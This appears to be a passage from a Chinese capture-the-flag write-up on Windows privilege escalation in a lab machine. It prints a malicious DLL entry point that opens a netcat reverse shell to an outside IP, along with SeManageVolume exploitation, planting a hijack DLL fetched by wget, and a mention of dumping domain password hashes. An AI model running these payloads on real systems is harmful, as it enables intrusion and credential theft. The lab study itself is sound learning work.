UsebasicParsing) 依赖shell.ps1的powershell脚本反弹，github上的恶意Printconfig.c是：

#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c C:\\windows\\tasks\\nc64.exe 10.8.0.101 443 -e cmd.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

这里是直接使用cmd运行nc64.exe进行反弹，所以其实我们也可以上传一个nc64.exe，然后用它来反弹。
DllMain是Dll文件的入口函数，详情见《windows核心编程》第20章：DLL高级技术
```

回到靶机中，先上传：

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe
```

然后执行：

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 863

DONE`
```

准备好恶意的tzres.c，然后用如下指令编译：

```
x86_64-w64-mingw32-gcc tzres.c -s -w -static -fpermissive -shared -o tzres.dll -m64
```

然后使用evil-winrm上传，或者使用wget下载，

```
wget http://10.10.14.43:9001/tzres.dll -O C:\Windows\System32\wbem\tzres.dll
```

然后这里卡在触发上，writeup中没有明确指明用什么，只是说可以用类似systeminfo的指令，但是这里systeminfo运行不了，又尝试了`tzutil  /g`，但是它是直接加载C:\Windows\System32\tzres.dll，而不是C:\Windows\System32\wbem\tzres.dll。而前者我们没有权限。尝试把这个程序和恶意dll复制到用户目录下执行，希望加载dll时从当前目录开始搜寻，也不行。

网上的大部分writeup到这里都是`certutil -store my`发现有根CA，直接导出根CA，利用根CA签发一个管理员证书。但是貌似是因为六月十号的靶机更新，这里查看证书会显示

```
Missing stored keyset
```

因此我们无法导出根CA，-exportPFX导出会有以下报错

```
CertUtil: -exportPFX command FAILED: 0x80090016 (-2146893802 NTE_BAD_KEYSET)
CertUtil: Keyset does not exist
```

网上找到的writeup日期也都在靶机更新之前。

我的猜测是靶机环境问题，导致没有权限。尝试了很多加载C:\Windows\System32\wbem\tzres.dll的指令，但是均失败。wbem目录下原本也没有tzres.dll。有点无从下手

找到了一个加载tzres.dll的方法：

```
$Code = @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllToLoad);
}
"@
 
Add-Type -TypeDefinition $Code
 
[Native]::LoadLibrary("C:\Windows\System32\wbem\tzres.dll")
```

但是这是以certificate\ryan.k的身份运行的，反弹shell回来也没有用。

这里实在是没找了，我个人还是觉得这是靶机环境问题。

后续是通过SeImpersonate权限提权到nt authority\system，但是这里的root flag是EFS加密的，因此我们还是要拿到adminstrator用户。直接拿到ntds.dit然后用impacket工具包中的secretsdump拿到管理员密码哈希。





总共耗时断断续续有了三天，虽然最后也没拿到root flag，但还是学到了很多新知识。同时也深刻意识到问AI再多不如亲自看看源码。要着重于当前问题的解决，而不是心猿意马，思绪游离海外。
